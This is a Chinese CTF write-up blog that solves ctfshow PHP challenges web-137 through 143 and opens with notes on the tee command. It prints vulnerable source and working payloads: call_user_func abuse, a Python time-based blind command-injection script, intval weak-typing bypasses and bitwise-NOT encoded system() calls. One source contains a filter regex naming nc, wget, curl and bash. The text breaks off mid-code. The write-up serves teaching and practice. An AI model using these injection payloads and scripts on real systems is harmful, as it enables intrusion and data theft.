<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">-a, --<span class="hljs-built_in">append</span><br></code></pre></td></tr></table></figure>

<p>此选项将标准输入附加到指定文件的末尾而不是覆盖它们。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">-</span>i, <span class="hljs-comment">--ignore-interrupts</span><br></code></pre></td></tr></table></figure>

<p>该选项忽略中断信号（如Ctrl+C）并继续运行。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">-</span>p, <span class="hljs-comment">--output-error</span><br></code></pre></td></tr></table></figure>

<p>此选项可防止 tee 命令因写入错误而退出。</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">--<span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure>

<p>此选项显示 tee 命令的帮助消息。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure>

<p>此选项显示 tee 命令的版本号。</p>
<p><strong>常用功能：</strong></p>
<p><strong>将标准输入写入文件：</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello,world!&quot;</span> | <span class="hljs-built_in">tee</span> hello.txt</span><br><br>这里是将语句写入到文件中<br></code></pre></td></tr></table></figure>

<p><strong>将标准输入附加到文件：</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello,world again!&quot;</span> | <span class="hljs-built_in">tee</span> -a hello.txt</span><br><br>将语句追加到文件中<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-137（call-user-func调用类的静态方法）"><a href="#web-137（call-user-func调用类的静态方法）" class="headerlink" title="web-137（call_user_func调用类的静态方法）"></a>web-137（call_user_func调用类的静态方法）</h2><p>源码：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">highlight_file</span>(__FILE__);<br>class ctfshow<br>&#123;<br>    function <span class="hljs-built_in">__wakeup</span>()&#123;<br>        <span class="hljs-built_in">die</span>(&quot;private class&quot;);<br>    &#125;<br>    static function <span class="hljs-built_in">getFlag</span>()&#123;<br>        echo <span class="hljs-built_in">file_get_contents</span>(&quot;flag.php&quot;);<br>    &#125;<br>&#125;<br><br><br><br><span class="hljs-built_in">call_user_func</span>($_POST[&#x27;ctfshow&#x27;]);<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>这题一看就知道要使用call_user_func回调函数来拿到flag，然后分析一下发现只要我们调用ctfshow类中的静态方法getFlag即可输出flag.php</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">post：<span class="hljs-attribute">ctfshow</span>=ctfshow::getFlag<br>然后查看源码即可得到flag<br></code></pre></td></tr></table></figure>

<h3 id="类的静态方法的调用"><a href="#类的静态方法的调用" class="headerlink" title="类的静态方法的调用"></a>类的静态方法的调用</h3><p><strong>语法：类+::+方法名</strong></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">-&gt;与::调用函数的区别：<br>-&gt; 调用实例方法<br>:: 调用静态方法<br>在类里面的时候，<span class="hljs-variable">$this</span>-&gt;func()和self::func()没什么区别。<br>在外部的时候，-&gt;必须是实例化后的对象使用；而::可以是未实例化的类名直接调用。<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-138（call-user-func数组调用静态方法）"><a href="#web-138（call-user-func数组调用静态方法）" class="headerlink" title="web-138（call_user_func数组调用静态方法）"></a>web-138（call_user_func数组调用静态方法）</h2><p>源码：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">highlight_file</span>(__FILE__);<br>class ctfshow<br>&#123;<br>    function <span class="hljs-built_in">__wakeup</span>()&#123;<br>        <span class="hljs-built_in">die</span>(&quot;private class&quot;);<br>    &#125;<br>    static function <span class="hljs-built_in">getFlag</span>()&#123;<br>        echo <span class="hljs-built_in">file_get_contents</span>(&quot;flag.php&quot;);<br>    &#125;<br>&#125;<br><br><span class="hljs-built_in">if</span>(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-built_in">die</span>(&quot;private function&quot;);<br>&#125;<br><br><span class="hljs-built_in">call_user_func</span>($_POST[&#x27;ctfshow&#x27;]);<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p>strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）</p>
<p>if(strripos($_POST[‘ctfshow’], “:”)&gt;-1)这里要求:在post传入的ctfshow里的位置不能大于-1，所以这里可以理解为不能有:的存在。</p>
<p><strong>绕过关键：call_user_func是支持传入数组的，可以用数组调用静态方法</strong></p>
<p>payload：</p>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs inform7">call_user_func调用类的静态方法 数组传入调用<br><br>post：ctfshow<span class="hljs-comment">[0]</span>=ctfshow&amp;ctfshow<span class="hljs-comment">[1]</span>=getFlag<br>然后查看源码即可得到flag<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="strripos"><a href="#strripos" class="headerlink" title="strripos()"></a>strripos()</h3><p><strong>strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">strripos</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$haystack</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$needle</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$offset</span> = <span class="hljs-number">0</span>): <span class="hljs-keyword">int</span><br>以不区分大小写的方式查找指定字符串在目标字符串中最后一次出现的位置。与 <span class="hljs-title function_ invoke__">strrpos</span>() 不同，<span class="hljs-title function_ invoke__">strripos</span>() 不区分大小写。 <br><br>haystack<br>    在此字符串中进行查找。<br>needle<br>    注意 needle 可以是一个单字符或者多字符的字符串。<br>offset<br>    参数 offset 可以被指定来查找字符串中任意长度的子字符串。<br>    负数偏移量将使得查找从字符串的起始位置开始，到 offset 位置为止。<br>   <br>返回 needle 相对于 haystack 字符串的位置(和搜索的方向和偏移量无关)。同时注意字符串的起始位置为<span class="hljs-number">0</span>而非<span class="hljs-number">1</span>。<br>如果 needle 未被发现，返回 <span class="hljs-literal">false</span>。 <br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-139"><a href="#web-139" class="headerlink" title="web-139"></a>web-139</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$x</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;too young too simple sometimes naive!&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$c</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p>本来准备用tee的，结果写入到1后访问url&#x2F;1没有反应，看了下题解说这题要用命令盲注</p>
<p>python题解脚本：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>import time<br>import string<br><span class="hljs-attribute">str</span>=string.ascii_letters+string.digits<br><span class="hljs-attribute">result</span>=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,5):         #知道flag在第四行，实际情况中把数字写大一些<br>	<span class="hljs-attribute">key</span>=0<br>	<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(1,15):     #文件名的长度大小<br>		<span class="hljs-keyword">if</span> <span class="hljs-attribute">key</span>==1:<br>			break<br>		<span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> str:<br>			<span class="hljs-attribute">payload</span>=<span class="hljs-string">&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;</span>.format(i,j,n)<br>			#<span class="hljs-built_in">print</span>(payload)<br>			<span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c=&quot;</span>+payload<br>			try:<br>				requests.<span class="hljs-built_in">get</span>(url,timeout=(2.5,2.5))<br>			except:<br>			    <span class="hljs-attribute">result</span>=result+n<br>			    <span class="hljs-built_in">print</span>(result)<br>			    break<br>			<span class="hljs-keyword">if</span> <span class="hljs-attribute">n</span>==&#x27;9&#x27;:<br>				<span class="hljs-attribute">key</span>=1<br>	result+=<span class="hljs-string">&quot; &quot;</span><br>得出flag在根目录下的f149_15_h3r3中，继续盲注得出flag值<br>import requests<br>import time<br>import string<br><span class="hljs-attribute">str</span>=string.digits+string.ascii_lowercase+&quot;-&quot;<br><span class="hljs-attribute">result</span>=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment">#key=0                      #key我感觉可以不用加</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(1,45):<br><span class="hljs-comment">#	if key==1:</span><br><span class="hljs-comment">#		break   </span><br>	<span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> str:<br>		<span class="hljs-attribute">payload</span>=<span class="hljs-string">&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;</span>.format(j,n)<br>		#<span class="hljs-built_in">print</span>(payload)<br>		<span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c=&quot;</span>+payload<br>		try:<br>			requests.<span class="hljs-built_in">get</span>(url,timeout=(2.5,2.5))<br>		except:<br>		    <span class="hljs-attribute">result</span>=result+n<br>		    <span class="hljs-built_in">print</span>(result)<br>		    break<br></code></pre></td></tr></table></figure>

<p>群主脚本：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><br>url = <span class="hljs-string">&quot;http://fea78741-014c-4a82-8924-e4fc2541579f.challenge.ctf.show/?c=&quot;</span><br>payload = <span class="hljs-string">&quot;if [ `cat /f149_15_h3r3  | cut -c &#123;&#125;` == \&quot;&#123;&#125;\&quot; ];then sleep 4;fi&quot;</span><br><br>result = <span class="hljs-string">&quot;+++++++++++++++++&quot;</span><br><br><span class="hljs-attribute">length</span>=48<br><br>strings  = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz_-0123456789&quot;</span><br><span class="hljs-comment">#strings  = &quot;ctfshow&#125;abdegijklmnpqruvwxyz_-0123456789&#123;&quot;</span><br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> range(1,length):<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;+++++++++++++++第&quot;</span>+str(c)+<span class="hljs-string">&quot;个字符&quot;</span>)<br>	<span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> strings:<br>		target = url+payload.format(c,s)<br>		#<span class="hljs-built_in">print</span>(target)<br>		try:<br>			requests.<span class="hljs-built_in">get</span>(target,<span class="hljs-attribute">timeout</span>=2.5)<br>		except:<br>			result +=s<br>			<span class="hljs-built_in">print</span>(result)<br>			break<br>	result += <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">awk <span class="hljs-attribute">NR</span>==num表示从第几行开始<br>ls / | awk <span class="hljs-attribute">NR</span>=num<br><br>cut截取字符第几个字符<br>ls / | awk <span class="hljs-attribute">NR</span>==2 | cut -c 2<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-140（弱类型比较、intval-）"><a href="#web-140（弱类型比较、intval-）" class="headerlink" title="web-140（弱类型比较、intval()）"></a>web-140（弱类型比较、intval()）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f1</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f1&#x27;</span>];<br>    <span class="hljs-variable">$f2</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="hljs-variable">$f1</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="hljs-variable">$f2</span>))&#123;<br>            <span class="hljs-variable">$code</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$f1</span>(<span class="hljs-subst">$f2</span>());&quot;</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$code</span>) == <span class="hljs-string">&#x27;ctfshow&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p>弱类型比较，这里intval会把非数字字符转为0，然后后面的ctfshow也会自动进行类型转换，转换为0，所以要让$code的值为一个非零数字即可拿到flag，而<code>$code = eval(&quot;return $f1($f2());&quot;);</code>这里表示将$f2函数得到的值作为$f1的参数，然后将值赋给$code</p>
<p>intval把非数字字符转为0，比如<code>intval(&#39;a&#39;)==0 intval(&#39;.&#39;)==0 intval(&#39;/&#39;)==0</code></p>
<p>payload：</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 1c">f1<span class="hljs-punctuation">=</span>md5<span class="hljs-meta">&amp;f2=phpinfo          <span class="hljs-comment">//md5(phpinfo())</span></span><br>f1<span class="hljs-punctuation">=</span>md5<span class="hljs-meta">&amp;f2=sleep            <span class="hljs-comment">//md5(sleep())</span></span><br>f1<span class="hljs-punctuation">=</span>md5<span class="hljs-meta">&amp;f2=md5              <span class="hljs-comment">//md5(md5())</span></span><br>f1<span class="hljs-punctuation">=</span>current<span class="hljs-meta">&amp;f2=localeconv   <span class="hljs-comment">//current(localeconv())</span></span><br>f1<span class="hljs-punctuation">=</span>sha1<span class="hljs-meta">&amp;f2=getcwd          <span class="hljs-comment">//sha1(getcwd()) </span></span><br>f1<span class="hljs-punctuation">=</span>usleep<span class="hljs-meta">&amp;f2=usleep        <span class="hljs-comment">//usleep(usleep())</span></span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-141（无字母数字命令执行（取反绕过））"><a href="#web-141（无字母数字命令执行（取反绕过））" class="headerlink" title="web-141（无字母数字命令执行（取反绕过））"></a>web-141（无字母数字命令执行（取反绕过））</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\W+$/&#x27;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>            <span class="hljs-variable">$code</span> =  <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span>;&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span> = &quot;</span>.<span class="hljs-variable">$code</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>&#x2F;^\W+$&#x2F; 作用是匹配非数字字母下划线的字符，所以这题考点很明显是无字母数字命令执行。</strong><br><strong>首先测试一下<code>eval(&quot;return 1;phpinfo();&quot;);</code>，不能执行phpinfo()，但是<code>eval(&quot;return 1-phpinfo()-1&quot;);</code>和<code>eval(&quot;return 1-phpinfo();&quot;);</code>所以我们构造payload就可以使用这两种类型</strong></p>
<p>payload：</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mel">用取反脚本构造 <span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac f*&#x27;</span>)<br>(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)	<span class="hljs-comment">//system(‘tac f*’)</span><br><br>用-<br>?v1=<span class="hljs-number">1</span>&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)-&amp;v2=<span class="hljs-number">1</span><br>用/<br>?v1=<span class="hljs-number">1</span>&amp;v3=/(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)/&amp;v2=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="无字母数字命令执行"><a href="#无字母数字命令执行" class="headerlink" title="无字母数字命令执行"></a>无字母数字命令执行</h3><p>yu22x的关于绕过正则表达式的文章：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">无字母数字命令执行绕过正则总结包括各种绕过脚本</a></p>
<hr>
<h2 id="web-142（is-numeric、sleep）"><a href="#web-142（is-numeric、sleep）" class="headerlink" title="web-142（is_numeric、sleep）"></a>web-142（is_numeric、sleep）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>))&#123;<br>        <span class="hljs-variable">$d</span> = (<span class="hljs-keyword">int</span>)(<span class="hljs-variable">$v1</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span>);<br>        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-variable">$d</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p>这里分析源码，很明显我们传入的v1的值必须是数字，然后会使用sleep函数，所以我们这里直接传入0即可</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">v1</span>=0<br>查看源码即可得到flag<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-143（无字母数字命令执行（异或绕过））"><a href="#web-143（无字母数字命令执行（异或绕过））" class="headerlink" title="web-143（无字母数字命令执行（异或绕过））"></a>web-143（无字母数字命令执行（异或绕过））</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span 